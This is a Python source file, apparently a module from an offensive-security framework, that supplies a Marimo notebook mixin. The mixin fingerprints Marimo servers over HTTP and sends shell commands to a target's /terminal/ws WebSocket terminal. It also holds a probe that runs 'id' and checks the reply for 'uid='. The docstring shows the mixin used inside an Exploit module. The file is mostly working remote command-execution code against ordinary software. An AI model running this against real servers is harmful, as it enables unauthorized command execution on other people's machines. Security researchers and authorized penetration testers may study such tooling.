#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Marimo notebook server mixin and WebSocket PTY helpers."""

from __future__ import annotations

import re
import ssl
import time
from typing import Callable, List, Optional, Tuple, Union

import websocket

from core.framework.base_module import BaseModule
from core.framework.option import OptBool, OptFloat, OptString

MARIMO_DEFAULT_PORT = 2718
MARIMO_TERMINAL_WS = "/terminal/ws"
MARIMO_VERSION_RE = re.compile(r"(0\.\d+\.\d+)")
PROMPT_RE = re.compile(r"^[\w.\-]+@[\w.\-]+:[^\s#$\r\n]*[#$]\s*$")


def marimo_version_tuple(version: str) -> Tuple[int, ...]:
    parts = [int(p) for p in re.findall(r"\d+", str(version or ""))]
    return tuple(parts) if parts else ()


def marimo_version_lt(left: str, right: str) -> bool:
    a = marimo_version_tuple(left)
    b = marimo_version_tuple(right)
    if not a or not b:
        return False
    width = max(len(a), len(b))
    return a + (0,) * (width - len(a)) < b + (0,) * (width - len(b))


def marimo_parse_version(text: str) -> str:
    match = MARIMO_VERSION_RE.search(text or "")
    return match.group(1) if match else ""


def marimo_clean_output(raw: str, command: str = "") -> str:
    """Strip echoed command and shell prompts from PTY output."""
    lines: List[str] = []
    cmd = (command or "").strip()
    for line in (raw or "").replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        stripped = line.strip()
        if not stripped:
            continue
        if cmd and (stripped == cmd or stripped.endswith(cmd)):
            continue
        if PROMPT_RE.match(stripped) or stripped.endswith("$") or stripped.endswith("#"):
            if len(stripped) < 80 and ("@" in stripped or stripped in ("$", "#")):
                continue
        lines.append(line.rstrip())
    return "\n".join(lines).strip()


def _as_text(chunk: Union[str, bytes, None]) -> str:
    if chunk is None:
        return ""
    if isinstance(chunk, bytes):
        return chunk.decode("utf-8", errors="replace")
    return str(chunk)


class MarimoTerminalClient:
    """Standalone PTY bridge over Marimo ``/terminal/ws`` (also built by :class:`Marimo` mixin)."""

    def __init__(
        self,
        host: str,
        port: int = MARIMO_DEFAULT_PORT,
        path: str = MARIMO_TERMINAL_WS,
        ssl_enabled: bool = False,
        verify_ssl: bool = False,
        timeout: float = 10.0,
        max_wait: float = 2.0,
    ):
        self.host = str(host or "").strip()
        self.port = int(port or MARIMO_DEFAULT_PORT)
        self.path = path if str(path).startswith("/") else f"/{path}"
        self.ssl_enabled = bool(ssl_enabled)
        self.verify_ssl = bool(verify_ssl)
        self.timeout = float(timeout or 10.0)
        self.max_wait = float(max_wait or 2.0)
        self.ws: Optional[websocket.WebSocket] = None

    @property
    def ws_url(self) -> str:
        scheme = "wss" if self.ssl_enabled else "ws"
        return f"{scheme}://{self.host}:{self.port}{self.path}"

    def connect(self) -> websocket.WebSocket:
        sslopt = None
        if self.ssl_enabled and not self.verify_ssl:
            sslopt = {"cert_reqs": ssl.CERT_NONE, "check_hostname": False}
        self.ws = websocket.create_connection(
            self.ws_url,
            timeout=self.timeout,
            sslopt=sslopt,
        )
        self.drain(settle=0.4)
        return self.ws

    def close(self) -> None:
        if self.ws:
            try:
                self.ws.close()
            except Exception:
                pass
            self.ws = None

    def drain(self, settle: float = 0.3) -> str:
        if not self.ws:
            return ""
        chunks: List[str] = []
        self.ws.settimeout(settle)
        deadline = time.time() + max(settle, 0.1)
        while time.time() < deadline:
            try:
                data = self.ws.recv()
            except Exception:
                break
            text = _as_text(data)
            if text:
                chunks.append(text)
        return "".join(chunks)

    def recv_until(self, max_wait: Optional[float] = None) -> str:
        if not self.ws:
            return ""
        wait = float(self.max_wait if max_wait is None else max_wait)
        chunks: List[str] = []
        self.ws.settimeout(min(0.35, max(wait, 0.1)))
        deadline = time.time() + max(wait, 0.1)
        while time.time() < deadline:
            try:
                data = self.ws.recv()
            except Exception:
                continue
            text = _as_text(data)
            if text:
                chunks.append(text)
        return "".join(chunks)

    def send_raw(self, data: str) -> None:
        if not self.ws:
            raise ValueError("WebSocket is not connected")
        self.ws.send(data)

    def execute(self, command: str, max_wait: Optional[float] = None) -> str:
        if not command:
            return ""
        if not self.ws:
            self.connect()
        payload = command if command.endswith("\n") else command + "\n"
        self.send_raw(payload)
        time.sleep(0.35)
        raw = self.recv_until(max_wait=max_wait)
        return marimo_clean_output(raw, command)


class MarimoCmdChannel:
    """http_cmd session bridge — reconnects per command."""

    def __init__(self, factory: Callable[[], MarimoTerminalClient]):
        self._factory = factory

    def run_command(self, command: str) -> str:
        client = self._factory()
        try:
            client.connect()
            return client.execute(command)
        finally:
            client.close()


class Marimo(BaseModule):
    """
    Marimo mixin — combine with :class:`Http_client` (and optionally :class:`Websocket_client`).

    Uses ``path`` (or ``terminal_path``) for the WebSocket endpoint and ``marimo_base_path``
    / ``base_path`` for HTTP fingerprinting.

    Example::

        class Module(Exploit, Http_client, Marimo):
            path = OptString("/terminal/ws", ...)
            ...
            def run(self):
                print(self.marimo_execute("id"))
    """

    marimo_base_path = OptString(
        "",
        "HTTP base path for Marimo fingerprint (falls back to BASE_PATH when empty)",
        False,
        advanced=True,
    )
    terminal_path = OptString(
        "",
        "Terminal WebSocket path (falls back to PATH when empty)",
        False,
        advanced=True,
    )
    any_ssl = OptBool(
        False,
        "Force WSS and disable TLS certificate verification",
        False,
        advanced=True,
    )
    max_wait = OptFloat(
        2.0,
        "Seconds to wait for PTY command output",
        False,
        advanced=True,
    )

    def _marimo_opt(self, option, default=""):
        if hasattr(option, "value"):
            return option.value if option.value is not None else default
        return option if option is not None else default

    def _marimo_bool(self, option, default=False) -> bool:
        value = self._marimo_opt(option, default)
        if isinstance(value, bool):
            return value
        if isinstance(value, str):
            return value.strip().lower() in ("true", "yes", "y", "1", "on")
        return bool(value)

    def marimo_http_base(self) -> str:
        for candidate in (
            self._marimo_opt(getattr(self, "marimo_base_path", ""), ""),
            self._marimo_opt(getattr(self, "base_path", ""), ""),
        ):
            base = str(candidate or "").strip()
            if base:
                return base if base.startswith("/") else f"/{base}"
        return "/"

    def marimo_ws_path(self) -> str:
        for candidate in (
            self._marimo_opt(getattr(self, "terminal_path", ""), ""),
            self._marimo_opt(getattr(self, "path", ""), MARIMO_TERMINAL_WS),
        ):
            path = str(candidate or "").strip() or MARIMO_TERMINAL_WS
            return path if path.startswith("/") else f"/{path}"
        return MARIMO_TERMINAL_WS

    def marimo_use_ssl(self) -> bool:
        return self._marimo_bool(getattr(self, "any_ssl", False)) or self._marimo_bool(
            getattr(self, "ssl", False)
        )

    def marimo_verify_ssl(self) -> bool:
        if self._marimo_bool(getattr(self, "any_ssl", False)):
            return False
        return self._marimo_bool(getattr(self, "verify_ssl", False))

    def marimo_max_wait(self) -> float:
        try:
            return max(0.5, float(self._marimo_opt(getattr(self, "max_wait", 2.0), 2.0) or 2.0))
        except Exception:
            return 2.0

    def marimo_host(self) -> str:
        for attr in ("target", "rhost"):
            if hasattr(self, attr):
                return str(self._marimo_opt(getattr(self, attr), "") or "").strip()
        return ""

    def marimo_port(self) -> int:
        for attr in ("port", "rport"):
            if hasattr(self, attr):
                try:
                    return int(self._marimo_opt(getattr(self, attr), MARIMO_DEFAULT_PORT) or MARIMO_DEFAULT_PORT)
                except Exception:
                    pass
        return MARIMO_DEFAULT_PORT

    def marimo_terminal_client(self) -> MarimoTerminalClient:
        return MarimoTerminalClient(
            host=self.marimo_host(),
            port=self.marimo_port(),
            path=self.marimo_ws_path(),
            ssl_enabled=self.marimo_use_ssl(),
            verify_ssl=self.marimo_verify_ssl(),
            timeout=float(self._marimo_opt(getattr(self, "timeout", 10), 10) or 10),
            max_wait=self.marimo_max_wait(),
        )

    def marimo_cmd_channel(self) -> MarimoCmdChannel:
        return MarimoCmdChannel(self.marimo_terminal_client)

    def marimo_http_get(self, path: str):
        if not hasattr(self, "http_request"):
            raise AttributeError("Marimo mixin requires Http_client (http_request missing)")
        if self.marimo_use_ssl() and hasattr(self, "ssl"):
            self.ssl = True
        return self.http_request(
            method="GET",
            path=path,
            timeout=max(int(self._marimo_opt(getattr(self, "timeout", 10), 10) or 10), 5),
            allow_redirects=True,
        )

    def marimo_http_version(self) -> str:
        root = self.marimo_http_base().rstrip("/")
        path = f"{root}/api/version" if root else "/api/version"
        try:
            response = self.marimo_http_get(path)
        except Exception:
            return ""
        if not response or int(getattr(response, "status_code", 0) or 0) != 200:
            return ""
        return marimo_parse_version(getattr(response, "text", "") or "")

    def marimo_detected(self) -> bool:
        root = self.marimo_http_base().rstrip("/")

        def _join(rel: str) -> str:
            if not root or root == "/":
                return rel if rel.startswith("/") else f"/{rel}"
            return f"{root}{rel if rel.startswith('/') else '/' + rel}"

        for rel in ("/", "/favicon.ico", "/api/version"):
            try:
                response = self.marimo_http_get(_join(rel))
            except Exception:
                continue
            if not response:
                continue
            text = (getattr(response, "text", "") or "").lower()
            headers = {
                str(k).lower(): str(v)
                for k, v in (getattr(response, "headers", {}) or {}).items()
            }
            if "marimo-version" in text or "marimo" in text[:2000]:
                return True
            if "marimo" in headers.get("server", ""):
                return True
            if rel.endswith("version") and marimo_parse_version(getattr(response, "text", "") or ""):
                return True
        return False

    def marimo_execute(self, command: str, max_wait: Optional[float] = None) -> str:
        client = self.marimo_terminal_client()
        if max_wait is not None:
            client.max_wait = float(max_wait)
        try:
            client.connect()
            return client.execute(command)
        finally:
            client.close()

    def marimo_probe(self, command: str = "id") -> tuple[bool, str]:
        cmd = str(command or "id").strip() or "id"
        try:
            output = self.marimo_execute(cmd)
        except Exception as exc:
            raise exc
        if cmd == "id":
            return ("uid=" in output, output)
        return (bool(output.strip()), output)
